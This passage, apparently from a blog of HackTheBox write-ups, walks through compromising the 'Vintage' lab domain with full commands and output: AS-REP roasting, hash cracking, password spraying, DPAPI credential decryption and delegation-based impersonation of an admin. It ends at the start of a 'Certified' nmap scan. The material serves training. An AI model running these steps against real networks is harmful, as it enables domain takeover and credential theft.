┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ getTGT.py -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in FS01$.ccache 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ export KRB5CCNAME=FS01\\$.ccache Now i will use bloodyAD to retrieve the msDS-ManagedPassword attribute that contains the GMSA01$ password\u0026rsquo;s NTLM hash.\n1 2 3 4 5 6 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k get object \u0026#39;GMSA01$\u0026#39; --attr msDS-ManagedPassword distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339 msDS-ManagedPassword.B64ENCODED: qNZ+qlGD+Cx17DM27SffmeF+2eftJRLCsHfxsLxSzhh2dERzgKmiJzvEHrfEAqstlS64r4Y1OQdu8sdCT6b8+gYXpLDa8xBQIFyshNK7YPrERV3rJVALnhITHE4lKIYoagI4Dr9owAMBGo7ZC4LOoBGk90mk4uuIMHNtylVRWva41F+v2TFCzSNfKnBSVuLhiZ+koEMTCkgP3Z+4Xnnluw6qkD3WPsnsYDlYYizOGPhsUwB1GJyzFHawe4iwfVnbWQdouCgflR27treFO5W0R5RqcRhkwEYLomOobFVUa3kGh1iQNdpaJLPI6Uo4767UM1O/sSaeML8nKVKhwsDolA== Once again i will try get the TGT of the GMSA01$ using its NTLM hash and export it to the KRB5CCNAME.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ getTGT.py vintage.htb/\u0026#39;gmsa01$\u0026#39; -hashes :51434c5b357ff89c5f85d994a27f7339 -dc-ip dc01.vintage.htb Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in gmsa01$.ccache 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ export KRB5CCNAME=gmsa01\\$.ccache I got back to Bloodhound and it turned out that GMSA01$ have GenericWrite and AddSelf ACL on the SERVICEMANAGERS Group.\nThis Servicemanagers group have GenericWrite on these 3 service accounts as it seems (svc_ark, svc_ldap and svc_sql)\nSo i added the GMSA01$ user account to this group by leveraging the AddSelf right using bloodyAD again.\n1 2 3 bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add groupMember \u0026#34;SERVICEMANAGERS\u0026#34; \u0026#34;P.Rosa\u0026#34; [+] P.Rosa added to CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB Since i have GenericAll on these accounts i tried to DONT_REQ_PREAUTH to their userAccountControl attributes.\n1 2 3 4 5 6 7 8 9 10 11 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_ARK\u0026#39;s userAccountControl ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_SQL\u0026#39;s userAccountControl ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_LDAP\u0026#39;s userAccountControl I used GetNPUsers.py to ASREPROAST these account but we got hashes except for the svc_sql which is weird.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile users.txt vintage.htb/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /home/ayoub/.local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User gMSA01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User FS01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User M.Rossi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User R.Verdi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User L.Bianchi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User G.Viola doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User C.Neri doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User P.Rosa doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) $krb5asrep$23$svc_ldap@VINTAGE.HTB:8935004afc9c3df69eb0a5bc47621d8b$e5eebf50edc698bd3f5e5c09d2775d050799b52e8831a0208d336223e0b74c9955a7857b1abe5688acdc44499e6ef32de5dddb38d60fb2d326bc6e4f65068f2f6c1ba6667359aad9a39dd7e02c2acb8609437143bae142fbdc64bf91f0140be899a0f38a7440c926769fbfabc7827ded393e143106b6a18731eb9456b7a3e41ac4b8865012fc70206a7a73ef0216d1452bfe45bbdc348a1fc26e733e7f8626599981edcba9f57e2c69b084d8a8a6955c2bd552a0f7b2479f3b11c93138bed924d0202fcb76dd7d9fa2f56e6295db55ce1f545f1195985aae0eb7e1b3197f03e68bc825017568e5ef6a23 $krb5asrep$23$svc_ark@VINTAGE.HTB:aaa9f68a14fd7e389d65ffa9be7f6a5e$ebe016f470e83e0976cdca9250bf63015b67b4c8aafef4dd15c302f69fbb68cd47623cb559ce38ad202993edca154960e7f6ec8a28be9506502ad1e8f3b4df9996ac41db60fa02442adcf07b5483d0b068ef4beb983fa0f9b0a059bd884be6c6b409ea070a5e605e096ec88f8e9efeeb8f6434ce9df9d27c4deca383a4c688a7a8e8c916c32c8901057a3204d2e75b8117676bf35de1324d8442d3cd801613056d940f3e1eed4fb7c8c085d16a60e42e7d6496fec559e5e530eaa898da11c158144dcc524de67c9bd511c600a01f04801910be17c5620eec9bfd80208b3bd4009cc00e87601a71532af9 [-] User C.Neri_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User L.Bianchi_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set I checked the userAccountControl of all account and it seems that the svc_sql is disabled as it have ACCOUNTDISABLE .\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host \u0026#34;dc01.vintage.htb\u0026#34; -d \u0026#34;vintage.htb\u0026#34; --kerberos --dc-ip 10.10.11.45 -k get search --filter \u0026#34;(objectClass=user)\u0026#34; --attr userAccountControl \u0026lt;SNIP\u0026gt; distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH distinguishedName: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH distinguishedName: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH distinguishedName: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD distinguishedName: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD So i enabled it using bloodyAD\n1 2 3 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE [-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_SQL\u0026#39;s userAccountControl I retried again and it succeed this time !\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile users.txt vintage.htb/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /home/ayoub/.local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User gMSA01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User FS01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User M.Rossi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User R.Verdi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User L.Bianchi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User G.Viola doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User C.Neri doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User P.Rosa doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$svc_sql@VINTAGE.HTB:e9d5b32940352f3bf4114333d1930da0$29a8e947b96a344e92180206c1ae5c51db3f0010ebfb984e6bd10492e2474a7e0a45092b804851ad968d2149846d777e1ce5cc590fff164ae11a16eb605892cd97e92f141fe173a6e18ceee689e1ace5da268f43991f185bc55cde86289872307ad44e9b8d3301062563af6d9d24c4fb0796103dad11ef11e4057d9123f45d86c7e14096e611a50f51bb51027278484545694cd54671d9dd41fe89df741bf3d01a01606f9f5e57341e1d64d4f28b5a6dfa70b44889762f8794be2ce5cbb6aeaf2a767011ad0dc46360bd52a22e1de87ac741d41150bcfd97ed64394b947808e19f7a779991a517c44fb7 $krb5asrep$23$svc_ldap@VINTAGE.HTB:90958306658dd10b4c019c56ef39fe1e$ce6a47b7f4337142af32290cd30a37be714d54c6d956bd9af3254e361a222a844be5985b55295f3cdbb2a9e245fd7d1b80e18fcd4d09dc0c4393a7d664a6d6d9cfc8ea51b24163cb60f372bf7f71c4cea2d73f5df40fff74ea106e0e0cd2cd23e59ca884b61c2a42e69a364752020e5575a0a60274850921bc8e731c1324fb6e07b32e1b3fabed928521599f749694b69bbae00d9e703140c329be90c73c457cf98fc0e128a969308227857aacc8f361c3e40ba519c4018c855cf8f734005d4e8a5ab0e94d3c265e390258d40ec80bb3848ea31cd13fa8069ee25f893bbcf353a90b8aba75d6bcf9d24c $krb5asrep$23$svc_ark@VINTAGE.HTB:b95d1f54813715a9fc875f1940d5cab6$ca10e91db21c4dea427b67a1226434ea1797350c9e0c7067940526248caca9b64ed9739cbdc059946da19f040ba43654166dc0d474b9d3beeb4ba56de6c457d5c53dcb2464a360b87770ec3c4de29495725c481836dd6c56fda373080cfe41eb56ef895091799ea02759feb49066ef4259672cb913c383ef6ae96b45d65c6109b9c60c89589b450d6b645f97088d99ecc7bee735173b120099188b07ca410e7f27c7871b33c5684a7f565bb03dfea7e3794d572a1e874ab82dc40726ad999a5fa0a65aae731e6f13af160e14c74c3d1a6f6ce5d75eb4ad537f7f82301bc9e687b80407ec023c9f9d5df4 [-] User C.Neri_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User L.Bianchi_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set I tried cracking these hashes using hashcat but only svc_sql end up being crackable and the password is Zer0the0ne.\n1 2 3 4 5 6 7 8 9 10 11 12 C:\\Windows\\hashcat-6.2.6\u0026gt;hashcat.exe -m 18200 C:\\Users\\razio\\Desktop\\hash.txt \u0026lt;SNIP\u0026gt; Dictionary cache hit: * Filename..: C:\\Users\\razio\\Desktop\\rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $krb5asrep$23$svc_sql@VINTAGE.HTB:e9d5b32940352f3bf4114333d1930da0$29a8e947b96a344e92180206c1ae5c51db3f0010ebfb984e6bd10492e2474a7e0a45092b804851ad968d2149846d777e1ce5cc590fff164ae11a16eb605892cd97e92f141fe173a6e18ceee689e1ace5da268f43991f185bc55cde86289872307ad44e9b8d3301062563af6d9d24c4fb0796103dad11ef11e4057d9123f45d86c7e14096e611a50f51bb51027278484545694cd54671d9dd41fe89df741bf3d01a01606f9f5e57341e1d64d4f28b5a6dfa70b44889762f8794be2ce5cbb6aeaf2a767011ad0dc46360bd52a22e1de87ac741d41150bcfd97ed64394b947808e19f7a779991a517c44fb7:Zer0the0ne As always, once getting a new password i perform a password spraying using kerbrute on the rest of the accounts and check for password reuse. And it seems that C.Neri has the same password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ kerbrute passwordspray -d vintage.htb --dc 10.10.11.45 ./users.txt \u0026#39;Zer0the0ne\u0026#39; __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (9cfb81e) - 03/17/25 - Ronnie Flathers @ropnop 2025/03/17 23:50:27 \u0026gt; Using KDC(s): 2025/03/17 23:50:27 \u0026gt; 10.10.11.45:88 2025/03/17 23:50:28 \u0026gt; [+] VALID LOGIN:\tC.Neri@vintage.htb:Zer0the0ne 2025/03/17 23:50:28 \u0026gt; Done! Tested 17 logins (1 successes) in 0.606 seconds Once again i will get back to Bloodhound and see what we can do with this account. And C.Neri has canPSRemote to the DC01.\nNext thing i will do is get a TGT for this account and export it to the KRB5CCNAME.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in c.neri.ccache 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ export KRB5CCNAME=c.neri.ccache Then i will connect to the DC using evil-winrm using the -r flag. And we retrieved the user\u0026rsquo;s flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ evil-winrm -i dc01.vintage.htb -r \u0026#39;vintage.htb\u0026#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\C.Neri\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\C.Neri\\Desktop\u0026gt; type user.txt 8853092457944387a12897bef73bc3e8 *Evil-WinRM* PS C:\\Users\\C.Neri\\Desktop\u0026gt; After a long time enumerating for any kind of privesc vectors either in Bloodhound or using the shell i got, i finally found this hidden file which indicates the presence of Credentials protected using DPAPI, which i downloaded on my local machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 *Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; mv C4BB96844A5C9DD45D5B6A9859252BA6 C:\\Users\\c.neri\\Desktop *Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; dir C:\\Users\\c.neri\\Desktop Directory: C:\\Users\\c.neri\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/7/2024 1:17 PM 2312 Microsoft Edge.lnk -ar--- 3/17/2025 12:02 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\c.neri\\Desktop\u0026gt; attrib -h -s C4BB96844A5C9DD45D5B6A9859252BA6 *Evil-WinRM* PS C:\\Users\\c.neri\\Desktop\u0026gt; download C4BB96844A5C9DD45D5B6A9859252BA6 Info: Downloading C:\\Users\\c.neri\\Desktop\\C4BB96844A5C9DD45D5B6A9859252BA6 to C4BB96844A5C9DD45D5B6A9859252BA6 Info: Download successful! For now we still need the keys to decrypt these potential credentials. and for that we went to the Protect directory where keys usually are found, and we found this directory with an SID name.\n1 2 3 4 5 6 7 8 9 10 *Evil-WinRM* PS C:\\Users\\c.neri\\Desktop\u0026gt; cd C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect *Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\u0026gt; dir Directory: C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect Mode LastWriteTime Length Name ---- ------------- ------ ---- d---s- 6/7/2024 1:17 PM S-1-5-21-4024337825-2033394866-2055507597-1115 Inside this directory, we found 2 potential Master keys which are 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 and 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847, which we will download locally for decryption.\n1 2 3 4 5 6 7 8 9 10 11 12 *Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\u0026gt; dir -h Directory: C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 6/7/2024 1:17 PM 740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -a-hs- 6/7/2024 1:17 PM 740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -a-hs- 6/7/2024 1:17 PM 904 BK-VINTAGE -a-hs- 6/7/2024 1:17 PM 24 Preferred The first step involves decrypting the Master Key using the impacket-dpapi tool. The Master Key is encrypted and tied to the user\u0026rsquo;s SID and password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE] Version : 2 (2) Guid : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b Flags : 0 (0) Policy : 0 (0) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL] LastWritten : 2024-06-07 15:08:23 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000001 (CRED_TYPE_GENERIC) Target : LegacyGeneric:target=admin_acc Description : Unknown : Username : vintage\\c.neri_adm Unknown : Uncr4ck4bl3P4ssW0rd0312 Bloodhound reveals that we can add ourselves to the DELEGATEDAMINS which from its name seems to be a good target.\nNow we will add SVC_SQLto this group using bloodyAD, as we have GenericWrite on it.\n1 2 3 4 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d \u0026#34;VINTAGE.HTB\u0026#34; -u c.neri_adm -p \u0026#39;Uncr4ck4bl3P4ssW0rd0312\u0026#39; -k add groupMember \u0026#34;DELEGATEDADMINS\u0026#34; \u0026#34;SVC_SQL\u0026#34; [+] SVC_SQL added to DELEGATEDADMINS 1 2 3 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k set object \u0026#34;SVC_SQL\u0026#34; servicePrincipalName -v \u0026#34;HTTP/skibbidy\u0026#34; [+] SVC_SQL\u0026#39;s servicePrincipalName has been updated 1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ getTGT.py -dc-ip 10.10.11.45 vintage/svc_sql:Zer0the0ne Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in svc_sql.ccache 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ export KRB5CCNAME=svc_sql.ccache 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ getST.py -spn \u0026#39;HTTP/dc01.vintage.htb\u0026#39; -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \u0026#39;vintage.htb/svc_sql:Zer0the0ne\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for user [*] Impersonating L.BIANCHI_ADM /home/ayoub/.local/bin/getST.py:321: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() /home/ayoub/.local/bin/getST.py:408: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [*] Requesting S4U2self /home/ayoub/.local/bin/getST.py:532: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() /home/ayoub/.local/bin/getST.py:584: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [*] Requesting S4U2Proxy [*] Saving ticket in L.BIANCHI_ADM.ccache 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ export KRB5CCNAME=L.BIANCHI_ADM.ccache 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Vintage] └─$ wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\\u0026gt;whomai \u0026#39;whomai\u0026#39; is not recognized as an internal or external command, operable program or batch file. C:\\\u0026gt;whoami vintage\\l.bianchi_adm C:\\\u0026gt;cd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is B8C0-0CD3 Directory of C:\\Users\\Administrator\\Desktop 11/14/2024 07:48 PM \u0026lt;DIR\u0026gt; . 06/08/2024 03:36 PM \u0026lt;DIR\u0026gt; .. 03/17/2025 12:02 PM 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 5,729,939,456 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;type root.txt 43fc4b204b904ddc0176ab7493ff5a21 ","date":"2025-03-01T00:00:00Z","image":"https://r4z1o.github.io/p/vintage-htb-writeup/Vintage_hu_daaecc953870e110.png","permalink":"https://r4z1o.github.io/p/vintage-htb-writeup/","title":"Vintage HTB Writeup"},{"content":"First, we start with a broad nmap scan, that reveals the following results :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo nmap -sV -sC -O -Pn --disable-arp-ping -p- -o Broad-scan-nmap 10.10.11.41 Nmap scan report for 10.10.11.41 Host is up (0.14s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-23 08:21:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2025-02-23T08:23:13+00:00; +2h49m55s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-02-23T08:23:11+00:00; +2h49m55s from scanner time. | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2025-02-23T08:23:13+00:00; +2h49m55s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.certified.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb | Not valid before: 2024-05-13T15:49:36 |_Not valid after: 2025-05-13T15:49:36 |_ssl-date: 2025-02-23T08:23:11+00:00; +2h49m55s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49683/tcp open msrpc Microsoft Windows RPC 49716/tcp open msrpc Microsoft Windows RPC 49740/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-02-23T08:22:32 |_ start_date: N/A |_clock-skew: mean: 2h49m54s, deviation: 0s, median: 2h49m54s | smb2-security-mode: | 